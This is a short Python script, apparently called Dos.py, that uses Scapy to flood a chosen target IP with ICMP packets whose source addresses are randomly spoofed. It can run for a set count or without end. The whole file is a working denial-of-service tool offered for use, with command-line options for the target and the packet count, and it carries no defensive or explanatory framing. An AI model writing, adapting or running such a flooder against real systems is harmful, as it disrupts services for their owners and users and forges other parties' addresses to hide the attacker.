# Usage : python Dos.py -t <target_ip> -c <count>

from scapy.all import IP, ICMP, send, RandIP
import argparse

def dos(target_ip, count):
    """
    Perform a DoS attack by sending ICMP packets with random source IPs to the target.
    If count is 0, the function sends packets indefinitely.
    """
    if count == 0:
        while True:
            packet = IP(src=str(RandIP()), dst=target_ip) / ICMP()
            send(packet, verbose=0)
    else:
        for _ in range(count):
            packet = IP(src=str(RandIP()), dst=target_ip) / ICMP()
            send(packet, verbose=0)

def main():
    parser = argparse.ArgumentParser(description='DoS Attack')
    parser.add_argument('-t', '--target', help='Target IP', required=True)
    parser.add_argument('-c', '--count', help='Number of packets to send (0 for infinite)', required=False, type=int, default=1000)
    args = parser.parse_args()

    dos(args.target, args.count)

if __name__ == '__main__':
    main()